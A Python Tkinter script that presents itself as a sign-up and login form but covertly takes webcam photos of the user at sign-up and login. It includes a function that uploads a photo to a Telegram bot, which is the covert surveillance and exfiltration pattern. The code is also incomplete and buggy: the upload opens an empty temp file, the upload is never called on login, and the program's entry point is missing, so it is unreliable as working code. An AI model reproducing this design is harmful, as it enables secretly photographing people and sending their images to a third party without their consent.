import tkinter as tk
from tkinter import messagebox
import psutil
import platform
import cv2
import requests
from PIL import Image, ImageTk
import tempfile


# Telegram Bot details
TELEGRAM_API_TOKEN = "your_telegram_bot_api_token"
TELEGRAM_CHAT_ID = "your_telegram_chat_id"


# Function to get system information
def get_system_info():
    system_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Processor": platform.processor(),
        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
    }
    return system_info


# Function to capture photo using the webcam
def take_photo():
    # Open the webcam
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        # Save the photo to a temporary file
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
        cv2.imwrite(temp_file.name, frame)

        # Open and display the image in Tkinter
        img = Image.open(temp_file.name)
        img.thumbnail((100, 100))  # Resize for display
        photo = ImageTk.PhotoImage(img)
        photo_label.config(image=photo)
        photo_label.image = photo  # Keep a reference to avoid garbage collection


# Function to handle the sign-up button click
def on_submit():
    username = username_entry.get()
    email = email_entry.get()
    password = password_entry.get()
    confirm_password = confirm_password_entry.get()
    phone_number = phone_entry.get()

    # Check if all fields are filled
    if not all([username, email, password, confirm_password, phone_number]):
        messagebox.showerror("Error", "Please fill in all fields.")
        return

    # Check if passwords match
    if password != confirm_password:
        messagebox.showerror("Error", "Passwords do not match.")
        return

    # Show success message
    messagebox.showinfo("Success", f"Welcome, {username}!")

    # Switch to login page
    switch_to_login()


# Function to switch to login page
def switch_to_login():
    # Clear the current window
    for widget in root.winfo_children():
        widget.destroy()

    # Create login page widgets
    login_label = tk.Label(root, text="Login", font=("Arial", 20, "bold"))
    login_label.pack(pady=20)

    username_label = tk.Label(root, text="Username:", font=("Arial", 12))
    username_label.pack(pady=5)
    global username_entry
    username_entry = tk.Entry(root, width=30, font=("Arial", 14))
    username_entry.pack(pady=5)

    password_label = tk.Label(root, text="Password:", font=("Arial", 12))
    password_label.pack(pady=5)
    global password_entry
    password_entry = tk.Entry(root, width=30, font=("Arial", 14), show="*")
    password_entry.pack(pady=5)

    login_button = tk.Button(root, text="Login", command=lambda: on_login(username_entry.get(), password_entry.get()))
    login_button.pack(pady=20)


# Function to handle login button click
def on_login(username, password):
    if username and password:
        # Automatically take a photo
        take_photo()
        # Send the photo to Telegram
        
        # Close the program after successful login
        root.quit()  # This will close the application
        
    else:
        messagebox.showerror("Error", "Please enter both username and password.")


# Function to send the photo to Telegram
def send_photo_to_telegram():
    # Open the last taken photo
    img_path = tempfile.NamedTemporaryFile(delete=False, suffix=".png").name
    # Open the image and send it to Telegram
    with open(img_path, "rb") as photo_file:
        url = f"https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/sendPhoto"
        data = {"chat_id": TELEGRAM_CHAT_ID}
        files = {"photo": photo_file}
        response = requests.post(url, data=data, files=files)

        if response.status_code == 200:
            messagebox.showinfo("Success", "Photo sent successfully to Telegram!")
        else:
            messagebox.showerror("Error", "Failed to send photo to Telegram.")


# Set up the Tkinter window
root = tk.Tk()
root.title("Sign Up and Login Form")

# Sign Up Page
def create_signup_page():
    # Create Sign-Up label
    sign_in_label = tk.Label(root, text="Sign Up", font=("Arial", 20, "bold"))
    sign_in_label.pack(pady=20)

    # Create and display the username label and textbox
    username_label = tk.Label(root, text="Username:", font=("Arial", 12))
    username_label.pack(pady=5)
    global username_entry
    username_entry = tk.Entry(root, width=30, font=("Arial", 14))
    username_entry.pack(pady=5)

    # Create and display the email label and textbox
    email_label = tk.Label(root, text="Email:", font=("Arial", 12))
    email_label.pack(pady=5)
    global email_entry
    email_entry = tk.Entry(root, width=30, font=("Arial", 14))
    email_entry.pack(pady=5)

    # Create and display the password label and textbox
    password_label = tk.Label(root, text="Password:", font=("Arial", 12))
    password_label.pack(pady=5)
    global password_entry
    password_entry = tk.Entry(root, width=30, font=("Arial", 14), show="*")
    password_entry.pack(pady=5)

    # Create and display the confirm password label and textbox
    confirm_password_label = tk.Label(root, text="Confirm Password:", font=("Arial", 12))
    confirm_password_label.pack(pady=5)
    global confirm_password_entry
    confirm_password_entry = tk.Entry(root, width=30, font=("Arial", 14), show="*")
    confirm_password_entry.pack(pady=5)

    # Create and display the phone number label and textbox
    phone_label = tk.Label(root, text="Phone Number:", font=("Arial", 12))
    phone_label.pack(pady=5)
    global phone_entry
    phone_entry = tk.Entry(root, width=30, font=("Arial", 14))
    phone_entry.pack(pady=5)

    # Display system information
    system_info = get_system_info()
    system_info_label = tk.Label(root, text=f"System Info:\n{system_info}", font=("Arial", 12))
    system_info_label.pack(pady=10)

    # Display the photo label
    global photo_label
    photo_label = tk.Label(root)
    photo_label.pack(pady=10)

    # Create the submit button
    submit_button = tk.Button(root, text="Submit", command=on_submit, width=20, height=2, font=("Arial", 14))
    submit_button.pack(pady=20)

    # Capture the user's photo
    take_photo()
    f=open("save.png","w")
    f.write("1")
    f.close()


# Run the Tkinter event loop




